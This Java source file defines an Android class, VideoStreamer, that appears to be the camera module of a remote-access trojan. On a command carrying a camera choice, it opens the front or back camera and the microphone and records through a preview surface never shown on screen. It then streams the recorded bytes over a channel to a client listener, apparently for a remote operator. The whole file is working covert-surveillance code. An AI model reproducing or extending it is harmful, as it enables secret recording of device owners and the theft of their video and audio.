package my.app.Library;

import android.app.Activity;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import my.app.client.ClientListener;
import android.content.Context;
import my.app.client.LauncherActivity;
import my.app.client.R;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class VideoStreamer extends Activity implements SurfaceHolder.Callback{
    private Camera camera;
    private MediaRecorder mediaRecorder;
    private boolean streaming = false;
    private Thread stream;
    private SurfaceHolder surHol;
    private ClientListener cl;
    private File tempstore;
    private FileInputStream fis;
    private int bytesRead = 0;
    private byte[] dataToSend;
    private int numCam = Camera.getNumberOfCameras();
    private int FrontCam = Camera.CameraInfo.CAMERA_FACING_FRONT;
    private int BackCam = Camera.CameraInfo.CAMERA_FACING_BACK;
    private int channel;
    private boolean isPrepared = false;

    public VideoStreamer(ClientListener c, byte [] args, int chan){
        cl = c;
        Context context = cl.getBaseContext();
        channel = chan;
        if (numCam > 1){
            if (args[0]== 0){
                camera = Camera.open(BackCam);
            }
            else{
                camera = Camera.open(FrontCam);
            }
        }
        else {
            camera = Camera.open();
        }
        stream = new Thread(
                new Runnable() {
                    public void run() {
                        record();
                    }
                });
        SurfaceView surView = new SurfaceView(cl); //(SurfaceView)findViewById(R.layout.videoview);
        surHol = surView.getHolder();
        surHol.addCallback(this);
        try {
            tempstore = File.createTempFile("Tryingagain",null,cl.getCacheDir());
            fis = new FileInputStream(tempstore);
        }catch(Exception e) {
            Log.e("VideoStream","Problem in creating File or Stream" );


        }

    }
    public void record(){
        int pb = 0;
        byte[] buffer = new byte[4096];

        prepare(surHol.getSurface());
        mediaRecorder.start();
        try{
            while(streaming) {
                bytesRead = fis.read(buffer);
                if (bytesRead == -1) {
                    break;
                }
                dataToSend = new byte[bytesRead];
                System.arraycopy(buffer,0,dataToSend,0,bytesRead);
                cl.handleData(channel,dataToSend);

            }

        }catch(IOException e){
            Log.e("Fis","No Bytes read from inputStream");
        }
        mediaRecorder.stop();
    }

    public void startStream(){
        streaming = true;
        stream.start();
    }

    public void stopStream(){
        streaming = false;
        mediaRecorder.reset();
        mediaRecorder.release();
        tempstore.delete();
        camera.release();
        mediaRecorder = null;
        camera = null;
    }

    public boolean prepare(Surface surface){
        mediaRecorder = new MediaRecorder();
        camera.unlock();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.MPEG_4_SP);
        //mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
        mediaRecorder.setVideoFrameRate(60);
        mediaRecorder.setOutputFile(tempstore.getAbsolutePath());
        mediaRecorder.setPreviewDisplay(surface);
        try {
            mediaRecorder.prepare();
            isPrepared = true;
        } catch ( IOException  | IllegalStateException e) {
            mediaRecorder.reset();
            mediaRecorder.release();
            return false;
        }
        return true;

    }
    public void surfaceCreated(SurfaceHolder holder){
        if (!isPrepared){
            prepare(surHol.getSurface());
        }
    }
    public void surfaceDestroyed(SurfaceHolder holder){
        stopStream();
    }
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h){}
}
